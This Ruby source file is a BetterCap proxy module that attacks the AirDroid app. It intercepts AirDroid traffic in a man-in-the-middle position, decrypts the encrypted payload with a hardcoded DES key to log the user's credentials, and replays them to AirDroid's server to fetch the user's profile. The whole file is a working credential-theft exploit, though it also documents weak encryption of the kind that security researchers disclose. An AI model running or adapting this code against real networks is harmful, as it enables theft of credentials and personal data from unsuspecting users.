=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

require 'json'
require 'openssl'
require 'uri'
require 'net/http'

class AirDroid < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'AirDroid',
    'Description' => 'Get AirDroid user access credentials.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @creds = nil
  @version = nil

  def on_request( request, response )
    if @creds.nil? and request.host.include?('airdroid.com') and request.path =~ /.*\/phone\/.+\/\?q=([A-F0-9]+)&ver=(.+)$/
      BetterCap::Logger.info "[#{'AIRDROID'.red} (v#{$2})] Detected user credentials encrypted payload:"

      data     = airdroid_decrypt($1)
      @creds   = JSON.parse(data)
      @version = $2

      msg = ''
      @creds.each do |key,value|
        msg << "  #{key.blue} : #{value}\n"
      end
      BetterCap::Logger.raw "\n#{msg}\n"

      BetterCap::Logger.info "[#{'AIRDROID'.red} (v#{$2})] Requesting user profile:"

      user_info = get_user_info_via_device_id

      msg = ''
      user_info.each do |key,value|
        msg << "  #{key.blue} : #{value}\n"
      end
      BetterCap::Logger.raw "\n#{msg}\n"

    end
  end

  private

  def get_user_info_via_device_id
    query = @creds
    query['fromtype'] = query['channel']

    payload = airdroid_encrypt( query.to_json )

    path = "/p14/user/getuserinfoviadeviceid.html?q=#{payload}&ver=#{@version}"
    headers = {
      'User-Agent' => 'Apache-HttpClient/UNAVAILABLE (java 1.4)'
    }

    http = Net::HTTP.new( 'id4.airdroid.com', 443 )
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    data = http.get( path, headers )
    plain = airdroid_decrypt( data.body )

    JSON.parse( plain )
  end

  def airdroid_decrypt( s, key = '890jklms' )
    cipher = OpenSSL::Cipher::Cipher.new('des-ecb')
    cipher.decrypt
    cipher.key = key
    plain = cipher.update( [s].pack('H*'))
    plain << cipher.final
    plain
  end

  def airdroid_encrypt( s, key = '890jklms' )
    cipher = OpenSSL::Cipher::Cipher.new('des-ecb')
    cipher.encrypt
    cipher.key = key
    enc = cipher.update(s)
    enc << cipher.final
    enc.each_byte.map { |b| "%02x" % b }.join.upcase
  end
end
